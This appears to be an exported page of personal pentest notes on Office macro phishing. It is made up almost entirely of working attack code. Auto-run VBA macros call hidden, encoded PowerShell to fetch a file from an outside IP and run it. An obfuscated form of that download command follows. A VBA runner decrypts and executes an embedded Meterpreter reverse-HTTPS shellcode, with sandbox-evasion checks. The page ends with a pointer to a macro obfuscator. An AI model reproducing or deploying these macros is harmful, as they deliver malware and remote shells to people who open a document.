<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Phishing with Office</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Phishing with Office</h1><br/><p></p><p><h2>Reverse shell with wget execute from disk powershell</h2><ul><li>word document that pulls dropper and store it on disk</li><li>we added small time delay to allow the file to completely download </li><li>we then executed the file hidden from the user </p><p></li></ul><div class="codebox"><pre>Sub Document_Open<span style="color:#ff9d00;font-weight:700">()</span><br />    MyMacro<br />End Sub<br /><br />Sub AutoOpen<span style="color:#ff9d00;font-weight:700">()</span><br />    MyMacro<br />End Sub<br /><br />Sub MyMacro<span style="color:#ff9d00;font-weight:700">()</span><br />    On Error Resume Next <span style="color:#3ad900;font-weight:400">&#39; Continue execution even if an error occurs<br />    Dim str As String<br />    Dim myLoc As String<br /><br />    &#39;</span> Fixed path to save the downloaded file<br />    myLoc = <span style="color:#3ad900;font-weight:400">&quot;C:\Windows\Tasks\random123.com&quot;</span><br /><br />    <span style="color:#3ad900;font-weight:400">&#39; Create the PowerShell command string<br />    str = &quot;powershell -exec bypass -nop -w hidden -enc powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMwA3AC4ANgAwAC4AMgAzADQALgAyADAAMwAvAHQAZQBzAHQALgBjAG8AbQAnACwAIAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXAByAGEAbgBkAG8AbQAxADIAMwAuAGMAbwBtACcAKQA=&quot;<br />    <br />    &#39;</span> Execute the PowerShell command to download the file<br />    Shell str, vbHide<br /><br />    <span style="color:#3ad900;font-weight:400">&#39; Wait for the download to complete<br />    Pause 10<br />    <br />    &#39;</span> Check if the file was downloaded<br />    If Dir<span style="color:#ff9d00;font-weight:700">(</span>myLoc<span style="color:#ff9d00;font-weight:700">)</span> <span style="color:#ff9d00;font-weight:700">&lt;&gt;</span> <span style="color:#3ad900;font-weight:400">&quot;&quot;</span> Then<br />        <span style="color:#3ad900;font-weight:400">&#39; Execute the downloaded file<br />        Shell myLoc, vbHide<br />        <br />        &#39;</span> Optional: Clean up the downloaded file after execution<br />        Pause 5 <span style="color:#3ad900;font-weight:400">&#39; Wait for the execution to complete<br />        If Dir(myLoc) &lt;&gt; &quot;&quot; Then Kill myLoc<br />    Else<br />        MsgBox &quot;Download failed: File not found at &quot; &amp; myLoc<br />    End If<br />End Sub<br /><br />Sub Pause(n As Long)<br />    Dim t As Date<br />    t = Now<br />    Do<br />        DoEvents<br />    Loop Until Now &gt;= DateAdd(&quot;s&quot;, n, t)</span><br /><span style="color:#3ad900;font-weight:400">End Sub</span><br /></pre></div></p><p>updated stripped </p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">Sub</span> Document_Open()<br />    MyMacro<br /><span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">Sub</span><br /><br /><span style="color:#ff9d00;font-weight:700">Sub</span> AutoOpen()<br />    MyMacro<br /><span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">Sub</span><br /><br /><span style="color:#ff9d00;font-weight:700">Sub</span> MyMacro()<br />    <span style="color:#ff9d00;font-weight:700">On</span> <span style="color:#ff9d00;font-weight:700">Error</span> <span style="color:#ff9d00;font-weight:700">Resume</span> <span style="color:#ff9d00;font-weight:700">Next</span> <br />    <span style="color:#ff9d00;font-weight:700">Dim</span> str <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">String</span><br />    <span style="color:#ff9d00;font-weight:700">Dim</span> myLoc <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">String</span><br /><br /><br />    myLoc = <span style="color:#3ad900;font-weight:400">&quot;C:\Windows\Tasks\random123.com&quot;</span><br /><br />    str = <span style="color:#3ad900;font-weight:400">&quot;powershell -exec bypass -nop -w hidden -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMwA3AC4ANgAwAC4AMgAzADQALgAyADAAMwAvAHQAZQBzAHQALgBjAG8AbQAnACwAIAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXAByAGEAbgBkAG8AbQAxADIAMwAuAGMAbwBtACcAKQA=&quot;</span><br />    <br />    Shell str, vbHide<br /><br />    Pause 10<br />    <br /><span style="color:#333333;font-weight:400">    If Dir(myLoc) &lt;&gt; &quot;&quot; Then</span><br />        Shell myLoc, vbHide<br />        <br />        Pause 5 <br /><span style="color:#333333;font-weight:400">        If Dir(myLoc) &lt;&gt; &quot;&quot; Then Kill myLoc</span><br /><span style="color:#333333;font-weight:400">    Else</span><br />        MsgBox <span style="color:#3ad900;font-weight:400">&quot;Download failed: File not found at &quot;</span> &amp; myLoc<br />    <span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">If</span><br /><span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">Sub</span><br /><br /><span style="color:#ff9d00;font-weight:700">Sub</span> Pause(n <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>)<br />    <span style="color:#ff9d00;font-weight:700">Dim</span> t <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Date</span><br />    t = Now<br />    <span style="color:#ff9d00;font-weight:700">Do</span><br />        DoEvents<br />    <span style="color:#ff9d00;font-weight:700">Loop</span> <span style="color:#ff9d00;font-weight:700">Until</span> Now &gt;= DateAdd(<span style="color:#3ad900;font-weight:400">&quot;s&quot;</span>, n, t)<br /><span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">Sub</span><br /></pre></div></p><p></p><p>Obfuscation commands</p><p></p><p><div class="codebox"><pre>powershell -exec bypass -nop -w hidden -(<span style="color:#ff9d00;font-weight:700">New</span>-<span style="color:#7f0044;font-weight:400">Object</span> Net.WebClient).DownloadFile(<span style="color:#0088ff;font-weight:400">&#39;http://37.60.234.203/test.com&#39;, &#39;C:\Windows\Tasks\random123.com&#39;)</span><br /><br /><br />: <br /><br /><br />&amp;(<span style="color:#0088ff;font-weight:400">&#39;P&#39;+(&quot;{0}{1}&quot; -f&#39;o&#39;,&#39;wer&#39;)+&#39;sh&#39;+&#39;eLl&#39;) -exec (&quot;{1}{0}&quot; -f&#39;s&#39;,(&quot;{0}{1}&quot; -f &#39;by&#39;,&#39;pas&#39;)) -nop -w (&quot;{1}{0}&quot; -f (&quot;{1}{0}&quot; -f &#39;en&#39;,&#39;idd&#39;),&#39;h&#39;) (&#39;-&#39;)(.(&#39;New&#39;+&#39;-o&#39;+(&quot;{1}{0}&quot;-f &#39;jEC&#39;,&#39;b&#39;)+&#39;t&#39;) (&quot;{2}{4}{3}{0}{1}&quot; -f&#39;ie&#39;,&#39;nt&#39;,&#39;N&#39;,&#39;l&#39;,(&quot;{1}{2}{0}&quot;-f &#39;.WebC&#39;,&#39;e&#39;,&#39;t&#39;))).(&quot;{1}{2}{0}{3}&quot; -f &#39;dFi&#39;,&#39;Do&#39;,(&quot;{1}{0}&quot;-f &#39;a&#39;,&#39;wnlo&#39;),&#39;le&#39;).&quot;inv`oKE&quot;(((&quot;{2}{1}{0}&quot; -f (&quot;{0}{1}&quot;-f &#39;://&#39;,&#39;3&#39;),&#39;p&#39;,&#39;htt&#39;)+&#39;7.6&#39;+(&quot;{0}{1}&quot; -f &#39;0.&#39;,&#39;23&#39;)+&#39;4.&#39;+&#39;2&#39;+&#39;03&#39;+&#39;/t&#39;+(&quot;{0}{1}&quot;-f &#39;est&#39;,&#39;.&#39;)+&#39;com&#39;), ((&#39;C:O&#39;+&#39;pJW&#39;+&#39;i&#39;+&#39;n&#39;+&#39;do&#39;+&#39;ws&#39;+&#39;O&#39;+(&quot;{0}{1}&quot; -f&#39;p&#39;,&#39;JTa&#39;)+(&quot;{2}{1}{0}&quot; -f &#39;Jra&#39;,(&quot;{1}{0}&quot;-f&#39;sOp&#39;,&#39;k&#39;),&#39;s&#39;)+(&quot;{1}{2}{0}&quot; -f&#39;2&#39;,(&quot;{0}{1}&quot;-f &#39;n&#39;,&#39;dom&#39;),&#39;1&#39;)+(&quot;{1}{0}&quot; -f (&quot;{1}{0}&quot;-f &#39;om&#39;,&#39;.c&#39;),&#39;3&#39;))-replaCe ([cHaR]79+[cHaR]112+[cHaR]74),[cHaR]92))</span></pre></div></p><p><h2>vba XOR shellcode runner</h2></p><p></p><p><div class="codebox"><pre>    <span style="color:#ff9d00;font-weight:700">Private</span> <span style="color:#ff9d00;font-weight:700">Declare</span> PtrSafe <span style="color:#ff9d00;font-weight:700">Function</span> VirtualAlloc <span style="color:#ff9d00;font-weight:700">Lib</span> <span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span> (<span style="color:#ff9d00;font-weight:700">ByVal</span> lpAddress <span style="color:#ff9d00;font-weight:700">As</span> LongPtr, <span style="color:#ff9d00;font-weight:700">ByVal</span> dwSize <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>, <span style="color:#ff9d00;font-weight:700">ByVal</span> flAllocationType <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>, <span style="color:#ff9d00;font-weight:700">ByVal</span> flProtect <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>) <span style="color:#ff9d00;font-weight:700">As</span> LongPtr<br />    <span style="color:#ff9d00;font-weight:700">Private</span> <span style="color:#ff9d00;font-weight:700">Declare</span> PtrSafe <span style="color:#ff9d00;font-weight:700">Function</span> RtlMoveMemory <span style="color:#ff9d00;font-weight:700">Lib</span> <span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span> (<span style="color:#ff9d00;font-weight:700">ByVal</span> lDestination <span style="color:#ff9d00;font-weight:700">As</span> LongPtr, <span style="color:#ff9d00;font-weight:700">ByRef</span> sSource <span style="color:#ff9d00;font-weight:700">As</span> Any, <span style="color:#ff9d00;font-weight:700">ByVal</span> lLength <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>) <span style="color:#ff9d00;font-weight:700">As</span> LongPtr<br />    <span style="color:#ff9d00;font-weight:700">Private</span> <span style="color:#ff9d00;font-weight:700">Declare</span> PtrSafe <span style="color:#ff9d00;font-weight:700">Function</span> CreateThread <span style="color:#ff9d00;font-weight:700">Lib</span> <span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span> (<span style="color:#ff9d00;font-weight:700">ByVal</span> SecurityAttributes <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>, <span style="color:#ff9d00;font-weight:700">ByVal</span> StackSize <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>, <span style="color:#ff9d00;font-weight:700">ByVal</span> StartFunction <span style="color:#ff9d00;font-weight:700">As</span> LongPtr, ThreadParameter <span style="color:#ff9d00;font-weight:700">As</span> LongPtr, <span style="color:#ff9d00;font-weight:700">ByVal</span> CreateFlags <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>, <span style="color:#ff9d00;font-weight:700">ByRef</span> ThreadId <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>) <span style="color:#ff9d00;font-weight:700">As</span> LongPtr<br />    <span style="color:#ff9d00;font-weight:700">Private</span> <span style="color:#ff9d00;font-weight:700">Declare</span> PtrSafe <span style="color:#ff9d00;font-weight:700">Function</span> Sleep <span style="color:#ff9d00;font-weight:700">Lib</span> <span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span> (<span style="color:#ff9d00;font-weight:700">ByVal</span> mili <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>) <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span><br />    <span style="color:#ff9d00;font-weight:700">Private</span> <span style="color:#ff9d00;font-weight:700">Declare</span> PtrSafe <span style="color:#ff9d00;font-weight:700">Function</span> FlsAlloc <span style="color:#ff9d00;font-weight:700">Lib</span> <span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span> (<span style="color:#ff9d00;font-weight:700">ByVal</span> lpCallback <span style="color:#ff9d00;font-weight:700">As</span> LongPtr) <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span><br /><br />    <span style="color:#ff9d00;font-weight:700">Sub</span> Document_Open()<br />      ShellcodeRunner<br />    <span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">Sub</span><br /><br />    <span style="color:#ff9d00;font-weight:700">Sub</span> AutoOpen()<br />      ShellcodeRunner<br />    <span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">Sub</span><br /><br />    <span style="color:#ff9d00;font-weight:700">Function</span> ShellcodeRunner()<br />      <span style="color:#ff9d00;font-weight:700">Dim</span> buf <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#ff9d00;font-weight:700">Variant</span><br />      <span style="color:#ff9d00;font-weight:700">Dim</span> tmp <span style="color:#ff9d00;font-weight:700">As</span> LongPtr<br />      <span style="color:#ff9d00;font-weight:700">Dim</span> addr <span style="color:#ff9d00;font-weight:700">As</span> LongPtr<br />      <span style="color:#ff9d00;font-weight:700">Dim</span> counter <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span><br />      <span style="color:#ff9d00;font-weight:700">Dim</span> data <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span><br />      <span style="color:#ff9d00;font-weight:700">Dim</span> res <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span><br />      <span style="color:#ff9d00;font-weight:700">Dim</span> dream <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#ff9d00;font-weight:700">Integer</span><br />      <span style="color:#ff9d00;font-weight:700">Dim</span> before <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Date</span><br />      <br />      <span style="color:#0088ff;font-weight:400">&#39; Check if we&#39;re in a sandbox by calling a rare-emulated API</span><br /><span style="color:#333333;font-weight:400">      If IsNull(FlsAlloc(tmp)) Then</span><br />        <span style="color:#ff9d00;font-weight:700">Exit</span> <span style="color:#ff9d00;font-weight:700">Function</span><br />      <span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">If</span><br /><br />      <span style="color:#0088ff;font-weight:400">&#39; Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction</span><br />      dream = Int((1500 * Rnd) + 2000)<br />      before = Now()<br />      Sleep (dream)<br /><span style="color:#333333;font-weight:400">      If DateDiff(&quot;s&quot;, t, Now()) &lt; dream Then</span><br />        <span style="color:#ff9d00;font-weight:700">Exit</span> <span style="color:#ff9d00;font-weight:700">Function</span><br />      <span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">If</span><br /><br />      <span style="color:#0088ff;font-weight:400">&#39; sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.51 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key a </span><br />     <br />     buf = Array(157,41,226,133,145,137,173,97,97,97,32,48,32,49,51,41,80,179,4,41,234,51,1,48,41,234,51,121,55,41,234,51,65,41,110,214,43,43,41,234,19,49,44,80,168,41,80,161,205,93,0,29,99,77,65,32,160,168,108,32,96,160,131,140,51,32,48,41,234,51,65,234,35,93,41,96,177,7,224,25,121, _<br />106,99,110,228,19,97,97,97,234,225,233,97,97,97,41,228,161,21,6,41,96,177,49,234,41,121,37,234,33,65,40,96,177,130,55,41,158,168,44,80,168,32,234,85,233,41,96,183,41,80,161,205,32,160,168,108,32,96,160,89,129,20,144,45,98,45,69,105,36,88,176,20,185,57,37,234,33,69,40,96, _<br />177,7,32,234,109,41,37,234,33,125,40,96,177,32,234,101,233,41,96,177,32,57,32,57,63,56,59,32,57,32,56,32,59,41,226,141,65,32,51,158,129,57,32,56,59,41,234,115,136,42,158,158,158,60,41,80,186,50,40,223,22,8,15,8,15,4,21,97,32,55,41,232,128,40,166,163,45,22,71,102, _<br />158,180,50,50,41,232,128,50,59,44,80,161,44,80,168,50,50,40,219,91,55,24,198,97,97,97,97,158,180,137,111,97,97,97,80,88,83,79,80,87,89,79,85,88,79,84,80,97,59,41,232,160,40,166,161,218,96,97,97,44,80,168,50,50,11,98,50,40,219,54,232,254,167,97,97,97,97,158,180,137, _<br />68,97,97,97,78,17,19,3,13,9,59,56,49,88,19,24,51,55,59,35,57,88,40,12,17,9,48,16,55,16,5,23,52,53,82,76,56,44,81,25,97,41,232,160,50,59,32,57,44,80,168,50,41,217,97,83,201,229,97,97,97,97,49,50,50,40,166,163,138,52,79,90,158,180,41,232,167,11,107,62, _<br />41,232,144,11,126,59,51,9,225,82,97,97,40,232,129,11,101,32,56,40,219,20,39,255,231,97,97,97,97,158,180,44,80,161,50,59,41,232,144,44,80,168,44,80,168,50,50,40,166,163,76,103,121,26,158,180,228,161,20,126,41,166,160,233,114,97,97,40,219,37,145,84,129,97,97,97,97,158,180,41, _<br />158,174,21,99,138,203,137,52,97,97,97,50,56,11,33,59,40,232,176,160,131,113,40,166,161,97,113,97,97,40,219,57,197,50,132,97,97,97,97,158,180,41,242,50,50,41,232,134,41,232,144,41,232,187,40,166,161,97,65,97,97,40,232,152,40,219,115,247,232,131,97,97,97,97,158,180,41,226,165,65, _<br />228,161,21,211,7,234,102,41,96,162,228,161,20,179,57,162,57,11,97,56,218,129,124,75,107,32,232,187,158,180)<br /><br /><br /><br /><br />      <span style="color:#0088ff;font-weight:400">&#39; XOR-decrypt the shellcode</span><br />      <span style="color:#ff9d00;font-weight:700">For</span> i = 0 <span style="color:#ff9d00;font-weight:700">To</span> UBound(buf)<br />        buf(i) = buf(i) <span style="color:#ff9d00;font-weight:700">Xor</span> Asc(<span style="color:#3ad900;font-weight:400">&quot;a&quot;</span>)<br />      <span style="color:#ff9d00;font-weight:700">Next</span> i<br /><br />      <span style="color:#0088ff;font-weight:400">&#39; &amp;H3000 = 0x3000 = MEM_COMMIT | MEM_RESERVE</span><br />      <span style="color:#0088ff;font-weight:400">&#39; &amp;H40 = 0x40 = PAGE_EXECUTE_READWRITE</span><br />      addr = VirtualAlloc(0, UBound(buf), &amp;H3000, &amp;H40)<br /><br />      <span style="color:#ff9d00;font-weight:700">For</span> counter = LBound(buf) <span style="color:#ff9d00;font-weight:700">To</span> UBound(buf)<br />        data = buf(counter)<br />        res = RtlMoveMemory(addr + counter, data, 1)<br />      <span style="color:#ff9d00;font-weight:700">Next</span> counter<br /><br />      res = CreateThread(0, 0, addr, 0, 0, 0)<br />    <span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">Function</span></pre></div></p><p></p><p><h2>Other obfuscation techniques</h2><ul><li><a href="https://github.com/bonnetn/vba-obfuscator">https://github.com/bonnetn/vba-obfuscator</a></li><li>/opt/vba-obfuscator</li></ul></p><p></p><p></p></div>
</body>
</html>
